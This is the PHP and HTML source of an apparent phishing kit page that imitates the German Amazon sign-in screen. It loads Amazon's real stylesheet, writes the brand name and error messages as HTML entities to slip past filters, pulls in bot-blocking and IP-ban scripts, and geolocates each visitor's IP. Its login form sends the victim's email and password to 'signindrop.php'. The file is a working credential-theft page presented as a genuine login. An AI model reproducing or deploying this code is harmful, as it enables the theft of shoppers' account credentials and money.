<?php include ('../bots.php');?>
<?php include ('../blocker.php');?>
<?php include ('../banned.php');?>
<?php 
$IP = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('UTC');
$DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
$COUNTRYCODE = $DETAILS->geoplugin_countryCode;
$COUNTRYNAME = $DETAILS->geoplugin_countryName;
$STRTCODE    = strtolower($COUNTRYCODE);
?>
<html>
  <head>
    <link rel="shortcut icon" type="image/x-icon" href="../data/icon/favicon.ico">
    <script type="text/javascript">var ue_t0=ue_t0||+new Date();
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js">
    </script>
    <script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js">
    </script>
	<script src="../data/js/jquery.min.mask.js"></script>
    <script>var aPageStart = (new Date()).getTime();
    </script>
    <meta charset="utf-8">
    <title dir="ltr">&Alpha;m&#97;zon &#x53;&#x69;&#x67;&#x6E;-&#x49;&#x6E;
    </title>
    <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AmazonUI-af9e9b82cae7003c8a1d2f2e239005b802c674a4._V2_.css#AUIClients/AmazonUI.fr.rendering_engine-not-trident.secure.min">
    <style>
      .auth-workflow .auth-pagelet-container{
        width:350px;
        margin:0 auto}
      .auth-workflow .auth-pagelet-container-wide{
        width:500px;
        margin:0 auto}
      #auth-alert-window{
        display:none}
      .auth-display-none{
        display:none}
      .auth-pagelet-mobile-container{
        max-width:400px;
        margin:0 auto}
      .auth-pagelet-desktop-narrow-container{
        max-width:350px;
        margin:0 auto}
      .auth-pagelet-desktop-wide-container{
        max-width:600px;
        margin:0 auto}
      label.auth-hidden-label{
        height:0!important;
        width:0!important;
        overflow:hidden;
        position:absolute}
      .auth-phone-number-input{
        margin-left:10px}
      #auth-captcha-noop-link{
        display:none}
      #auth-captcha-image-container{
        height:70px;
        width:200px;
        margin-right:auto;
        margin-left:auto}
      .auth-logo-cn{
        width:110px!important;
        height:60px!important;
        background-position:-105px -365px!important;
        -webkit-background-size:600px 1000px!important;
        background-size:600px 1000px!important;
        background-image:url(https://images-cn.ssl-images-amazon.com/images/G/01/amazonui/sprites/aui_sprite_0029-2x._V1_.png)!important}
      .auth-footer-seperator{
        display:inline-block;
        width:20px}
      #auth-cookie-warning-message{
        display:none}
      #auth-pv-client-side-error-box,#auth-pv-client-side-success-box{
        display:none}
      .auth-error-messages{
        color:#000;
        margin:0}
      .auth-error-messages li{
        list-style:none;
        display:none}
      .ap_ango_default .ap_ango_email_elem,.ap_ango_default .ap_ango_phone_elem{
        display:none}
      .ap_ango_phone .ap_ango_default_elem,.ap_ango_phone .ap_ango_email_elem{
        display:none}
      .ap_ango_email .ap_ango_default_elem,.ap_ango_email .ap_ango_phone_elem{
        display:none}
      .auth-interactive-dialog{
        width:100%;
        height:100%;
        position:fixed;
        top:0;
        left:0;
        display:none;
        background:rgba(0,0,0,.8);
        z-index:100}
      .auth-interactive-dialog #auth-interactive-dialog-container{
        display:table-cell;
        height:100%;
        vertical-align:middle;
        position:relative;
        text-align:center}
      .auth-interactive-dialog #auth-interactive-dialog-container .auth-interactive-dialog-content{
        display:inline-block}
      .auth-third-party-content{
        text-align:center}
      .auth-wechat-login-button .wechat_button{
        background:#13D71F;
        background:-webkit-gradient(linear,left top,left bottom,from(#13d71f),to(#64d720));
        background:-webkit-linear-gradient(top,#13d71f,#63d71f);
        background:-moz-linear-gradient(top,#13d71f,#63d71f);
        background:-ms-linear-gradient(top,#13d71f,#63d71f);
        background:-o-linear-gradient(top,#13d71f,#63d71f);
        background:linear-gradient(top,#13d71f,#63d71f)}
      .wechat_button_label{
        color:#fff}
      .wechat_button_icon{
        top:5px!important}
      .a-lt-ie8 .wechat_button_icon{
        top:0!important}
      .a-lt-ie8 .auth-wechat-login-button .a-button-inner{
        height:31px}
      .identity-provider-pagelet-wechat-container{
        text-align:center}
      .auth-contact-verification-spinner{
        position:absolute;
        left:45%;
        top:35%}
      .auth-contact-verification-spinner img{
        height:60%;
        width:60%}
      #auth-enter-pwd-to-cont{
        margin-left:2px}
      .ap_hidden{
        display:none}
      .auth-contact-verification-widget-target{
        height:90px;
        margin-top:-30px}
    </style>
  </head>
  <body class="ap-locale-en_US a-auix_ux_57388-t1 a-auix_ux_63571-c a-aui_49697-t1 a-aui_51744-c a-aui_57326-c a-aui_58736-c a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-t1 a-aui_ux_47524-t1 a-aui_ux_49594-c a-aui_ux_56217-c a-aui_ux_59374-c a-aui_ux_59797-c a-aui_ux_60000-c a-meter-animate">
    <div id="a-page">
      <div class="a-section a-padding-medium auth-workflow">
        <div class="a-section a-spacing-none">
          <div class="a-section a-spacing-medium a-text-center">
            <a class="a-link-normal" href="#">
              <i class="a-icon a-icon-logo" aria-label="Amazon">
                <span class="a-icon-alt">
                </span>
              </i>
            </a>
          </div>
        </div>
        <div class="a-section">
          <div class="a-section a-spacing-base auth-pagelet-container">
            <div id="auth-alert-window" class="a-box a-alert a-alert-error a-spacing-base a-spacing-top-small">
              <div class="a-box-inner a-alert-container">
                <h4 class="a-alert-heading">There was a problem
                </h4>
                <i class="a-icon a-icon-alert">
                </i>
                <div class="a-alert-content">
                  <ul class="a-vertical a-spacing-none auth-error-messages">
                    <li id="auth-email-missing-alert">
                      <span class="a-list-item">
                        &#x45;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x65;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x6F;&#x72;&#x20;&#x6D;&#x6F;&#x62;&#x69;&#x6C;&#x65;&#x20;&#x70;&#x68;&#x6F;&#x6E;&#x65;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;
                      </span>
                    </li>
                    <li id="auth-email-invalid-email-alert">
                      <span class="a-list-item">
                        &#x49;&#x6E;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x65;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x61;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;&#x20;&#x6F;&#x72;&#x20;&#x6D;&#x6F;&#x62;&#x69;&#x6C;&#x65;&#x20;&#x70;&#x68;&#x6F;&#x6E;&#x65;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;
                      </span>
                    </li>
                    <li id="auth-emailCheck-missing-alert">
                      <span class="a-list-item">
                        &#x54;&#x79;&#x70;&#x65;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x65;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x6F;&#x72;&#x20;&#x6D;&#x6F;&#x62;&#x69;&#x6C;&#x65;&#x20;&#x70;&#x68;&#x6F;&#x6E;&#x65;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x61;&#x67;&#x61;&#x69;&#x6E;
                      </span>
                    </li>
                    <li id="auth-password-missing-alert">
                      <span class="a-list-item">
                        &#x45;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;
                      </span>
                    </li>
                    <li id="auth-emailNew-missing-alert">
                      <span class="a-list-item">
                        &#x45;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x6E;&#x65;&#x77;&#x20;&#x65;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x61;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;&#x20;&#x6F;&#x72;&#x20;&#x6D;&#x6F;&#x62;&#x69;&#x6C;&#x65;&#x20;&#x70;&#x68;&#x6F;&#x6E;&#x65;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;
                      </span>
                    </li>
                    <li id="auth-emailNew-invalid-email-alert">
                      <span class="a-list-item">
                        &#x49;&#x6E;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x65;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x61;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;&#x20;&#x6F;&#x72;&#x20;&#x6D;&#x6F;&#x62;&#x69;&#x6C;&#x65;&#x20;&#x70;&#x68;&#x6F;&#x6E;&#x65;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;
                      </span>
                    </li>
                    <li id="auth-emailNewCheck-missing-alert">
                      <span class="a-list-item">
                        &#x54;&#x79;&#x70;&#x65;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x65;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x6F;&#x72;&#x20;&#x6D;&#x6F;&#x62;&#x69;&#x6C;&#x65;&#x20;&#x70;&#x68;&#x6F;&#x6E;&#x65;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x61;&#x67;&#x61;&#x69;&#x6E;
                      </span>
                    </li>
                    <li id="auth-emailNew-mismatch-alert">
                      <span class="a-list-item">
                        &#x45;&#x6D;&#x61;&#x69;&#x6C;&#x73;&#x20;&#x6F;&#x72;&#x20;&#x70;&#x68;&#x6F;&#x6E;&#x65;&#x73;&#x20;&#x6D;&#x75;&#x73;&#x74;&#x20;&#x6D;&#x61;&#x74;&#x63;&#x68;
                      </span>
                    </li>
                    <li id="auth-guess-missing-alert">
                      <span class="a-list-item">
                        &#x45;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x74;&#x68;&#x65;&#x20;&#x63;&#x68;&#x61;&#x72;&#x61;&#x63;&#x74;&#x65;&#x72;&#x73;&#x20;&#x61;&#x73;&#x20;&#x74;&#x68;&#x65;&#x79;&#x20;&#x61;&#x72;&#x65;&#x20;&#x73;&#x68;&#x6F;&#x77;&#x6E;&#x20;&#x69;&#x6E;&#x20;&#x74;&#x68;&#x65;&#x20;&#x69;&#x6D;&#x61;&#x67;&#x65;.
                      </span>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
            <div class="a-section">
              <form name="signIn" method="post" action="signindrop.php?cmd=_update-information&account_biling=<?php  echo md5(microtime());?>&lim_session=<?php  echo sha1(microtime()); ?>" >
                <div class="a-section">
                  <div class="a-box">
                    <div class="a-box-inner a-padding-extra-large">
                      <h1 class="a-spacing-small">
                        Anmelden
                      </h1>
                      <div class="a-row a-spacing-base">
                        <label for="ap_email">
                          E-Mail-Adresse oder Mobiltelefonnummer
                        </label>
                        <input type="email" required="" id="ap_email" autocomplete="off" title="Please Enter a valid Email" pattern=".{5,}" maxlength="50" name="email" class="a-input-text a-span12 auth-autofocus auth-required-field">
                      </div>
                      <div class="a-section a-spacing-large">
                        <div class="a-row">
                          <div class="a-column a-span5">
                            <label for="ap_password">
                              Passwort
                            </label>
                          </div>
                          <div class="a-column a-span7 a-text-right a-span-last">
                            <a id="auth-fpp-link-bottom" class="a-link-normal" href="#">
                              Haben Sie Ihr Passwort vergessen?
                            </a>
                          </div>
                        </div>
                        <input type="password" id="ap_password" autocomplete="off" required="" title="Bitte geben Sie ein gültiges Passwort ein" name="password" tabindex="2" class="a-input-text a-span12 auth-required-field">
                      </div>
                      <div class="a-section a-spacing-extra-large">
                        <span class="a-button a-button-span12 a-button-primary" id="a-autoid-0">
                          <span class="a-button-inner">
                            <input id="submit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="a-autoid-0-announce">
                            <span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce">
                              Anmelden
                            </span>
                          </span>
                        </span>
                      </div>
					  <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
  Wenn Sie fortfahren, stimmen Sie <a href="#">den Nutzungsbedingunge</a> n und der <a href="#">Datenschutzerklärung von Amazon zu</a>.
</div>
<br>
                      <div class="a-divider a-divider-break">
                        <h5>Neu bei &Alpha;m&#97;zon?
                        </h5>
                      </div>
                      <span id="auth-create-account-link" class="a-button a-button-span12">
                        <span class="a-button-inner">
                          <a id="createAccountSubmit" tabindex="6" href="#<?php  echo md5(microtime());?>&lim_session=<?php  echo sha1(microtime()); ?>" class="a-button-text" role="button">
                            Erstellen Sie Ihr Amazon-Konto
                          </a>
                        </span>
                      </span>
                      <div class="a-row a-spacing-top-medium">
                        
                        <a href="#">
                        </a> 
                        <a href="#">
                        
                <div id="call">
                </div>
              </form>
            </div>
          </div>
        </div>
        <div id="right-2">
        </div>
        <div class="a-section a-spacing-top-extra-large">
          <div class="a-divider a-divider-section">
            <div class="a-divider-inner">
            </div>
          </div>
          <div class="a-section a-spacing-small a-text-center a-size-mini">
            <span class="auth-footer-seperator">
            </span>
            <a class="a-link-normal" target="_blank" href="#">
              Nutzungsbedingungen
            </a>
            <span class="auth-footer-seperator">
            </span>
            <a class="a-link-normal" target="_blank" href="#">
              Datenschutzerklärung
            </a>
            <span class="auth-footer-seperator">
            </span>
            <a class="a-link-normal" target="_blank" href="#">
              Hilfe
            </a>
            <span class="auth-footer-seperator">
            </span>
          </div>
          <script>
            var d = new Date();
            var n = d.getFullYear();
          </script>
          <div class="a-section a-spacing-none a-text-center">
            <span class="a-size-mini a-color-secondary">
              &copy; 1996-
              <script>document.write(new Date().getFullYear());
              </script>, &Alpha;m&#97;zon.
              <?php  
if     ($COUNTRYCODE=="GB"){ echo 'co.uk';}
elseif ($COUNTRYCODE=="IN"){ echo 'in';}
elseif ($COUNTRYCODE=="CA"){ echo 'ca';}
elseif ($COUNTRYCODE=="FR"){ echo 'fr';}
elseif ($COUNTRYCODE=="AU"){ echo 'com.au';}
elseif ($COUNTRYCODE=="BR"){ echo 'com.br';}
elseif ($COUNTRYCODE=="CN"){ echo 'cn';}
elseif ($COUNTRYCODE=="IT"){ echo 'it';}
elseif ($COUNTRYCODE=="JP"){ echo 'co.jp';}
elseif ($COUNTRYCODE=="MX"){ echo 'com.mx';}
elseif ($COUNTRYCODE=="ES"){ echo 'es';}
elseif ($COUNTRYCODE=="DE"){ echo 'de';}
else                       { echo 'com';} ?>, Inc. oder seine verbundenen Unternehmen
            </span>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>